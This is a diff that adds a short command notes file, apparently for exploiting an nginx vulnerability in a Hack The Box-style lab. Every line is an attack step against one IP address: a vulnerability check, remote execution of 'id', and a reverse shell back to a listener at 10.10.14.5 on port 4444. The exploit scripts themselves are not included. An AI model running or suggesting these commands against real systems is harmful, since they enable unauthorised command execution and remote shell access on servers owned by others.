@@ -1,0 +1,16 @@
+124.70.89.2
+
+
+
+
+python3 nginx_rift_htb.py --target 124.70.89.2 --check-only
+
+
+
+python3 nginx_rift_helper.py --target 124.70.89.2 --all
+
+
+python3 nginx_rift_htb.py --target 124.70.89.2 --port 80 --cmd "id"
+
+
+python3 nginx_rift_htb.py --target 124.70.89.2 --shell --lhost 10.10.14.5 --lport 4444
